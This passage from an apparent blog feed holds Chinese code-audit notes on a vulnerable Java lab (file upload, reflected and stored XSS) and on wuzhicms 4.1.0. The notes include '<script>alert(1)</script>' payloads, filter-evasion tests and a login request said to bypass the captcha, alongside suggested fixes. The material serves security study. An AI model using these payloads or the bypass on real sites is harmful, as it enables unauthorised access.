#61AFEF">isEmpty</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #7F848E; font-style: italic">// 赋值给uploadStatus.html里的动态参数message</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">redirectAttributes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFlashAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;message&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;Please select a file to upload&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;redirect:/file/status&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #7F848E; font-style: italic">// Get the file and save it somewhere</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] bytes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">file</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Path</span><span style="color: #E06C75"> path </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(UPLOADED_FOLDER </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">file</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOriginalFilename</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(path, bytes);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">redirectAttributes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFlashAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;message&quot;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #98C379">&quot;You successfully uploaded &#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> UPLOADED_FOLDER </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">file</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOriginalFilename</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&#39;&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">IOException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">redirectAttributes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFlashAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;message&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;upload failed&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;redirect:/file/status&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>上传文件  未判断文件的类型、扩展名等信息，未对生成文件的文件名进行重置</p><p>​ 直接将文件上传到文件保存目录中</p></li><li><p>payload</p><p>直接上传</p></li></ol><p>解决：</p><ol><li>使用<strong>白名单</strong>校验扩展名（如 <code>jpg</code>, <code>png</code>, <code>pdf</code>）</li><li>双重验证 MIME 类型（<code>file.getContentType()</code>）</li><li>对上传图片实际内容的判断，如果图片可以正常读取，就判断其为允许上传文件，否则上传失败。</li><li>生成安全文件名（设置成随机字符拼接…）（防止路径遍历和注入）</li></ol><ul><li>如果上传文件名是路径（..&#x2F;是向上跳转，最后会出现路劲遍历的漏洞）</li><li>攻击者知道服务器上已有重要文件（比如其他用户上传的合法文件 <code>avatar.jpg</code>），可以故意使用相同的文件名上传恶意文件（攻击文件），直接覆盖原文件。后续用户访问执行恶意代码</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>\src\main\java\org\joychou\controller\XSS.java</p><ul><li><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * Vuln Code.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * ReflectXSS</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * http://localhost:8080/xss/reflect?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">xss</span><span style="color: #7F848E; font-style: italic"> unescape string</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     */</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/reflect&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ResponseBody</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">reflect</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> xss) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> xss</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>参数未做过滤，直接显示在前端页面</p></li><li><p>payload</p><p>直接在url中编写xss脚本即可</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">localhost:9000/xss/reflect?xss=&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span><span style="color: #61AFEF">alert</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ol></li><li><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * Vul Code.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * StoredXSS Step1</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * http://localhost:8080/xss/stored/store?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">xss</span><span style="color: #7F848E; font-style: italic"> unescape string</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    */</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/stored/store&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ResponseBody</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">store</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> xss</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #E06C75"> response) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Cookie</span><span style="color: #E06C75"> cookie </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Cookie</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;xss&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> xss)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addCookie</span><span style="color: #ABB2BF">(cookie);</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Set param into cookie&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   }</span></span><span class="line"><span style="color: #E06C75">  </span></span><span class="line"><span style="color: #7F848E; font-style: italic">   /**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * Vul Code.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * StoredXSS Step2</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * http://localhost:8080/xss/stored/show</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">xss</span><span style="color: #7F848E; font-style: italic"> unescape string</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    */</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/stored/show&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ResponseBody</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">show</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">CookieValue</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;xss&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> xss) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> xss</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   }</span></span></code></pre></div></div></figure><p>存储型xss漏洞</p><p>​store方法将未经过滤的参数直接存储于cookie中</p><p>​show方法在cookie中将存储的漏洞参数直接显示在页面上</p></li><li><p>payload</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">写入&lt;script&gt;alert(1)&lt;/script&gt;</span></span></code></pre></div></div></figure></li></ol></li></ul><p>解决：</p><ol><li>输入转义（重要）</li><li>限制长度</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms代码审计</title>
    <link href="/2025/10/27/wuzhicms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/wuzhicms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>通过网盘分享的文件：wuzhicms-4.1.0.zip<br>链接: <a href="https://pan.baidu.com/s/1fVsmBHV_0gp4qWEvQuB2Lw">https://pan.baidu.com/s/1fVsmBHV_0gp4qWEvQuB2Lw</a> 提取码: rh9j</p><h1 id="初审-mvc参数"><a href="#初审-mvc参数" class="headerlink" title="初审(mvc参数)"></a>初审(mvc参数)</h1><p>了解到wuzhicms根据MVC,寻找参数</p><ol><li>打开网站，进入index.php,查看index.php源代码</li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">php</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// +----------------------------------------------------------------------</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// | wuzhicms [ 五指互联网站内容管理系统 ]</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// | Copyright (c) 2014-2015 http://www.wuzhicms.com All rights reserved.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// | Licensed ( http://www.wuzhicms.com/licenses/ )</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// | Author: wangcanjia &lt;phpip@qq.com&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// +----------------------------------------------------------------------</span></span><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * 程序入口文件</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> */</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//检测PHP环境</span></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">PHP_VERSION</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;5.2.0&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">die</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Require PHP &gt; 5.2.0 &#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//定义当前的网站物理路径</span></span><span class="line"><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;WWW_ROOT&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #56B6C2">dirname</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">__FILE__</span><span style="color: #ABB2BF">)</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;/&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">require</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;./configs/web_config.php&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">require</span><span style="color: #ABB2BF"> COREFRAME_ROOT</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;core.php&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$app</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;application&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">$app</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span></span></code></pre></div></div></figure><ol start="2"><li>追溯到 load_class到—————&gt;\coreframe\core.php</li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$m</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;core&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$param</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$static_class</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">//判断是否存在类，存在则直接返回</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$static_class</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$static_class</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">file_exists</span><span style="color: #ABB2BF">(COREFRAME_ROOT</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;app/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$m</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;/libs/class/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;.class.php&#39;</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;WUZHI_&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">class_exists</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$name</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">===</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">require_once</span><span style="color: #ABB2BF">(COREFRAME_ROOT</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;app/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$m</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;/libs/class/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;.class.php&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">//如果存在扩展类，则初始化扩展类</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$class</span><span style="color: #56B6C2">!=</span><span style="color: #98C379">&#39;application&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$class</span><span style="color: #56B6C2">!=</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">file_exists</span><span style="color: #ABB2BF">(COREFRAME_ROOT</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;app/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$m</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;/libs/class/EXT_&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;.class.php&#39;</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;EXT_&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$class</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">  ............</span><span style="color: #ABB2BF">.</span></span></code></pre></div></div></figure><ol start="3"><li><p>查找$static_class的类     (搜索class目录名称以及根据$app &#x3D; load_class(‘application’);)定位到——–&gt;</p><p>coreframe\app\core\libs\class\application.class.php</p></li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">__construct</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">setconfig</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;M&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_m</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;F&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_f</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;V&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_v</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure><p>参数为    <code>m</code>  <code>f </code>  <code> v</code></p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="审计1（xss）"><a href="#审计1（xss）" class="headerlink" title="审计1（xss）"></a>审计1（xss）</h2><p>登录后台后，在“我的提问”中存在xss漏洞</p><p>输入测试语句</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192519601.png" alt="image-20250717000001395"></p><p>将  <code> &lt;s  </code> 过滤</p><h2 id="审计2（xss）"><a href="#审计2（xss）" class="headerlink" title="审计2（xss）"></a>审计2（xss）</h2><p>未登录后台，在搜索界面测试xss代码</p><p>在将代码闭合之后发现未出现弹窗</p><p>将   <code>/</code>  过滤，转为html编码，发现   <code>#</code>   和   <code>；</code>   也被过滤 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192522349.png" alt="image-20250717003336068"></p><h2 id="审计3（rce）"><a href="#审计3（rce）" class="headerlink" title="审计3（rce）"></a>审计3（rce）</h2><p>抓包进行验证码测试（只输入用户名和密码，不输入验证码）</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">username</span><span style="color: #56B6C2">=</span><span style="color: #98C379">admin</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">password</span><span style="color: #56B6C2">=</span><span style="color: #98C379">admin</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">checkcode</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">savecookie</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">submit</span><span style="color: #56B6C2">=</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">savecookie</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #98C379">-------</span><span style="color: #ABB2BF">-&gt;&amp;</span><span style="color: #98C379">savecookie=</span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #61AFEF">直接绕过验证码验证</span></span></code></pre></div></div></figure><ol><li><p>定位到\configs\web_config.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;TEST_CHECKCODE&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//1 打开测试验证码，0 正常验证码</span></span><span class="line"><span style="color: #56B6C2">define</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;SQL_LOG&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li><li><p>TEST_CHECKCODE———&gt; \api\identifying_code.php\</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 